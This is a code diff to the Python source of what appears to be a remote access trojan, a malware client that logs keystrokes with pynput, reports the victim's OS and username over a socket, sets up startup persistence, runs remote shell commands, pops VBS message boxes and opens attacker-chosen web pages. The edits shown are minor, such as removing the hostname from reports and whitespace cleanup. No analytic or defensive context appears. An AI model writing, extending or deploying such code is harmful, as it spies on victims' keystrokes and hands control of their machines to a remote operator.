@@ -54,6 +54,7 @@ def OnKeyboardEvent(event):
     else:
         strKeyLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character
 
+
 KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
 Key = pynput.keyboard.Key
 
@@ -68,15 +69,15 @@ def recvall(buffer):  # function to receive large amounts of data
         if len(bytData) == buffer:
             return bytData
 
-			
+
 # vbs message box
 def MessageBox(message):
     objVBS = open(TMP + "/m.vbs", "w")
     objVBS.write("Msgbox \"" + message + "\", vbOKOnly+vbInformation+vbSystemModal, \"Message\"")
     objVBS.close()
     subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
-	
-	
+
+
 def msg(data):
     strMsg = data[3:len(data)]
     MessageBox(strMsg)
@@ -97,11 +98,10 @@ def startup():
 
 def info():
     strOS = platform.system() + " " + platform.release()
-    strPCName = socket.gethostname()
 
     strUser = os.environ["USERNAME"]
 
-    strInfo = "OS: " + strOS + "\n" + "PC Name: " + strPCName + "\n" + "Username: " + strUser + "\n"
+    strInfo = "OS: " + strOS + "\n" + "Username: " + strUser + "\n"
     objSocket.send(str.encode(strInfo))
 
 
@@ -329,7 +329,7 @@ def keylogger(option):
 
 
 def run_command(command):
-    strLogOutput = socket.gethostname() + "\n"
+    strLogOutput = "\n"
 
     if len(command) > 0:
         objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
@@ -357,7 +357,7 @@ try:
         elif strData[:3] == "msg":
             msg(strData)
         elif strData[:4] == "site":
-            webbrowser.open(strData[4:len(strData)])
+            webbrowser.get().open(strData[4:len(strData)])
         elif strData == "startup":
             startup()
         elif strData == "info":
